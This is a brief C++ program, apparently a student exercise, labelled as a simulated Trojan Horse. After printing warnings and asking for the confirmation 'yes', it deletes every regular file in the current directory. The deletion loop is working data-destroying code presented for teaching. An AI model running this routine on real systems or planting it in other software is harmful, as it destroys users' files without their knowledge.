#include <iostream>
#include <fstream>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

int main() {
    cout << "This program simulates a Trojan Horse and will attempt to delete files in the current directory.\n";
    cout << "WARNING: Do not run this code on a real system. It is for educational purposes only.\n";

    string confirmation;
    cout << "Type 'yes' to proceed: ";
    cin >> confirmation;

    if (confirmation == "yes") {
        for (const auto& entry : fs::directory_iterator(".")) {
            if (entry.is_regular_file()) {
                fs::remove(entry.path());
                cout << "Deleted: " << entry.path() << endl;
            }
        }
    } else {
        cout << "Operation cancelled.\n";
    }
    cout << "Name: Kramik Kafle\nRoll No: 104\n";

    return 0;
}
